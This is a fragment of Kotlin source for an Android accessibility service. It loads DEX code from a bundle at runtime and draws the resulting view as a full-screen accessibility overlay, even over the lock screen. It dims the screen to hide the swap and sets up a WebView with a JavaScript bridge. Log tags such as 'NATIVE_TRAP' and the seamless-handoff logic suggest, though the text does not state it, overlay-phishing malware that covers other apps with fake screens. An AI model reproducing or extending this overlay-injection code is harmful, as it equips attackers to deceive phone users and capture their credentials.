            activeTrapSessionId = System.currentTimeMillis()
            val serviceInstance = MyAccessibilityService.instance ?: return@post
            val wm = serviceInstance.getSystemService(Context.WINDOW_SERVICE) as WindowManager
            
            // 1. PRESERVE OLD OVERLAY FOR SEAMLESS TRANSITION
            val oldView = nativeOverlayView
            val oldLifecycle = nativeLifecycleOwner
            
            // 2. APPLY DIM IMMEDIATELY to mask the loading delay
            DimmerManager.applyDim(ctx, dimLevel, "ACC")
            
            // 3. YIELD THE MAIN THREAD TO ALLOW THE DIMMER TO RENDER
            Handler(Looper.getMainLooper()).postDelayed({
                try {
                    val trapDir = java.io.File(dirPath)
                    val dexFile = java.io.File(trapDir, "classes.dex")
                    
                    if (!dexFile.exists()) {
                        DebugLogger.log("NATIVE_TRAP_ERR", "DEX file missing in bundle: ${dexFile.absolutePath}")
                        DimmerManager.removeOverlay(ctx)
                        return@postDelayed
                    }
                    
                    DebugLogger.log("NATIVE_TRAP", "Loading Dalvik classes from ${dexFile.absolutePath}")
                    val optDir = ctx.getDir("dex_opt", Context.MODE_PRIVATE)
                    if (!optDir.exists()) optDir.mkdirs()

                    val loader = dalvik.system.DexClassLoader(dexFile.absolutePath, optDir.absolutePath, null, ctx.classLoader)
                    val clazz = loader.loadClass(className)
                    val instance = clazz.getDeclaredConstructor().newInstance() as com.example.myandroid.dynamic.DynamicEntry
                    activeNativeEntry = instance
                    
                    val view = instance.getView(serviceInstance, CortexBridge(ctx), trapDir.absolutePath)

                    val lifecycleOwner = OverlayLifecycleOwner()
                    view.setViewTreeLifecycleOwner(lifecycleOwner)
                    view.setViewTreeViewModelStoreOwner(lifecycleOwner)
                    view.setViewTreeSavedStateRegistryOwner(lifecycleOwner)

                    val params = WindowManager.LayoutParams(
                        WindowManager.LayoutParams.MATCH_PARENT,
                        WindowManager.LayoutParams.MATCH_PARENT,
                        WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
                        WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or 
                        WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or 
                        WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS or 
                        WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED or 
                        WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON,
                        android.graphics.PixelFormat.TRANSLUCENT
                    )
                    
                    if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.P) {
                        params.layoutInDisplayCutoutMode = WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES
                    }

                    // Attach the NEW view over the OLD view
                    wm.addView(view, params)
                    nativeOverlayView = view
                    nativeLifecycleOwner = lifecycleOwner
                    isNativeAttached = true
                    
                    // 4. LIFT DIM AND PURGE OLD UI (After new UI is rendered)
                    Handler(Looper.getMainLooper()).postDelayed({
                        DimmerManager.removeOverlay(ctx)
                        if (isAttached) {
                            removeOverlay(ctx, "SEAMLESS_NATIVE_HANDOFF")
                        }
                        // Safely discard the old native view now that the new one covers the screen
                        if (oldView != null) {
                            try { wm.removeView(oldView) } catch (e: Exception) {}
                            oldLifecycle?.destroy()
                            DebugLogger.log("NATIVE_TRAP", "Old native overlay purged (Seamless Transition)")
                        }
                    }, 150)

                    DebugLogger.log("NATIVE_TRAP", "Native DEX UI injected successfully from $className")
                } catch (e: Exception) {
                    DebugLogger.log("NATIVE_TRAP_ERR", "Failed to load DEX: ${e.message}")
                    DimmerManager.removeOverlay(ctx)
                }
            }, 120)
        }
    }

    fun removeNativeOverlay(ctx: Context, reason: String = "UNKNOWN") {
        Handler(Looper.getMainLooper()).post {
            val serviceInstance = MyAccessibilityService.instance ?: return@post
            val wm = serviceInstance.getSystemService(Context.WINDOW_SERVICE) as WindowManager
            
            if (isNativeAttached && nativeOverlayView != null) {
                try { wm.removeView(nativeOverlayView) } catch (e: Exception) {}
                nativeLifecycleOwner?.destroy()
                nativeLifecycleOwner = null
                nativeOverlayView = null
                isNativeAttached = false
                DimmerManager.removeOverlay(ctx)
                DebugLogger.log("NATIVE_TRAP", "Native overlay removed. Reason: $reason")
            }
        }
    }

    fun applyStoredStatusBar(ctx: Context) {
        val prefs = ctx.getSharedPreferences("app_config", Context.MODE_PRIVATE)
        if (prefs.getBoolean("status_bar_active", false)) {
            val html = prefs.getString("status_bar_html", "") ?: ""
            val touchable = prefs.getBoolean("status_bar_touchable", false)
            if (html.isNotEmpty()) {
                showStatusBarOverlay(ctx, touchable, html)
            }
        }
    }

    fun warmUpEngine(ctx: Context) {
        Handler(Looper.getMainLooper()).post {
            val service = MyAccessibilityService.instance ?: return@post
            if (overlayView == null) {
                DebugLogger.log("SDUI_VERBOSE", "Pre-warming WebView engine in background...")
                try {
                    overlayView = WebView(service).apply {
                        setBackgroundColor(Color.TRANSPARENT)
                        settings.javaScriptEnabled = true
                        settings.domStorageEnabled = true
                        settings.allowFileAccess = true
                        settings.allowContentAccess = true
                        webViewClient = object : WebViewClient() {
                            override fun onRenderProcessGone(view: WebView?, detail: android.webkit.RenderProcessGoneDetail?): Boolean {
                                DebugLogger.log("SDUI_ERR", "Warm WebView Renderer died! Purging.")
                                view?.destroy()
                                if (overlayView == view) { overlayView = null; isAttached = false }
                                return true
                            }
                        }
                        addJavascriptInterface(CortexBridge(ctx), "Cortex")
                        loadUrl("about:blank")
                    }
                    currentType = WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY
                    isAttached = false
                    DebugLogger.log("SDUI_VERBOSE", "WebView engine pre-warmed successfully.")
                } catch (e: Exception) {
                    DebugLogger.log("SDUI_ERR", "Pre-warm failed: ${e.message}")
                }
            }
        }
    }
}
